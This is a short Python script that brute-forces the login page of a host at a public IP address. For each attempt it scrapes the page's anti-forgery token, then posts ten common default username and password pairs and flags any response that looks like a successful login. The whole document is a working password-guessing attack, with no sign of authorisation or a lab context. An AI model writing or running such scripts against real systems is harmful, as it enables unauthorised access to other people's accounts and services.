
import requests
import re

session = requests.Session()

# Common credentials to try
credentials = [
    ("admin", "password"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("root", "root"),
    ("root", "password"),
    ("guest", "guest"),
    ("administrator", "administrator"),
]

attempt = 0

for username, password in credentials:
    attempt += 1
    if attempt > 10:
        print(f"Reached 10 attempts limit")
        break
    
    # Get fresh token
    resp = session.get("http://31.97.117.123/login.php")
    
    # Extract token from response
    match = re.search(r"user_token['\"] value=['\"](.*?)['\"]", resp.text)
    if match:
        token = match.group(1)
    else:
        token = "574fcd28f93f57c93cb554ecaf3ca520"
    
    # Try login
    login_data = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token
    }
    
    resp = session.post("http://31.97.117.123/login.php", data=login_data)
    
    # Check if login successful
    if "incorrect" not in resp.text and "Login" in resp.text and len(resp.text) < 2000:
        print(f"Attempt {attempt}: {username}:{password} - FAILED (still on login page)")
    elif "incorrect" in resp.text:
        print(f"Attempt {attempt}: {username}:{password} - FAILED (incorrect)")
    else:
        print(f"Attempt {attempt}: {username}:{password} - POSSIBLE SUCCESS!")
        print(f"Response length: {len(resp.text)}")
        if "Welcome" in resp.text or "dashboard" in resp.text.lower():
            print(f"SUCCESS! Login with {username}:{password}")
            break

